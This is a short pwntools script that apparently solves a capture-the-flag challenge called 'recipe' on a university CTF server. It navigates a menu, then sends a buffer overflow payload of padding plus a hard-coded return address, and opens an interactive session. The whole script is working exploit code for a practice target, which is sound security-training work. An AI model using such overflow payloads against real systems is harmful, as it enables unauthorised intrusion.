from pwn import *

# p = process('./recipe')
p = remote('ctf.unswsecurity.com','7000')
# context.log_level = 'debug'

for i in range(13):
    p.recv()
    p.sendline('2')
    print(i)
p.sendline('4')
p.recv()
# p.sendline(cyclic(20))
# p.interactive()
p.sendline("AAAAAAAAAABCD" + p32(0x8048636))
p.interactive()
# p.recv()
